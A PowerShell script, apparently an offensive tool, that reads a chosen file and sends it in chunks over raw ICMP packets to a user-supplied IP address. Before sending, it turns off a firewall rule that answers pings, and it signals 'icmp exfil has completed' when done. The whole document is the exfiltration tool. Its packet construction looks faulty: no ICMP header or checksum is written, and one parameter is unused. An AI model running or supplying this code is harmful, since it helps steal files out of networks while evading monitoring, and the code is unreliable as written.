param (
    [string]$source,
    [string]$destination,
    [string]$file,
    [int]$blockSize = 1000,
    [switch]$verbose
)

function Disable-PingReply {
    Write-Host "[+] Disabling ICMP Ping Replies..."
    try {
        Set-NetFirewallRule -DisplayName "File and Printer Sharing (Echo Request - ICMPv4-In)" -Enabled False -PassThru
    } catch {
        Write-Host "[!] Error disabling ping replies. Run as administrator."
        exit
    }
}

function Send-ICMPFile {
    Disable-PingReply
    if (!(Test-Path $file)) {
        Write-Host "[!] File not found: $file"
        exit
    }

    $icmpClient = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Raw, [System.Net.Sockets.ProtocolType]::Icmp)
    $fileBytes = [System.IO.File]::ReadAllBytes($file)
    $numBlocks = [math]::Ceiling($fileBytes.Length / $blockSize)
    Write-Host "[+] Staging file $file for ICMP transfer..."
    Write-Host "[+] Run Invoke-IcmpDownload on the target system."

    for ($i = 0; $i -lt $fileBytes.Length; $i += $blockSize) {
        $endIdx = [math]::Min($i + $blockSize, $fileBytes.Length)
        $dataChunk = $fileBytes[$i..($endIdx-1)]
        $icmpPacket = New-Object byte[] ($dataChunk.Length + 28)
        [System.Buffer]::BlockCopy($dataChunk, 0, $icmpPacket, 28, $dataChunk.Length)

        $icmpClient.SendTo($icmpPacket, [System.Net.EndPoint] (New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($destination), 0)))

        if ($verbose) {
            Write-Host "[+] Sent block: $((($i / $blockSize) + 1)) / $numBlocks"
        }
    }

    # Send completion message
    $completeMsg = [System.Text.Encoding]::ASCII.GetBytes("icmp exfil has completed")
    $icmpClient.SendTo($completeMsg, [System.Net.EndPoint] (New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($destination), 0)))
    Write-Host "[+] File transfer complete!"
}

Send-ICMPFile
